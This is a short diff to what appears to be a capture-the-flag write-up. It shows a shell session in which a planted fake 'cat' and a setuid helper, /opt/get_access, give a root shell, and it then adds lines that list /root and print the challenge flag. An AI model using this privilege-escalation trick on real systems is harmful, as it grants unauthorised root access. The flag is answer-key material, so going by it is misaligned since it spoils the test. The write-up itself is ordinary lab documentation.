@@ -419,5 +419,12 @@ dexter@debian:~$ chmod 755 ./cat
 dexter@debian:~$ /opt/get_access
 root@debian:~# whoami
 root
-root@debian:~# 
+root@debian:~# cd /root/
+root@debian:/root# ls -lrt
+total 8
+-rw-r--r-- 1 root root  45 Sep 25  2021 root.txt
+-rw-r--r-- 1 root root 260 Sep 25  2021 system.info
+root@debian:/root# more root.txt 
+ICA{Next_Generation_Self_Renewable_Genetics}
+root@debian:/root# 
 ```
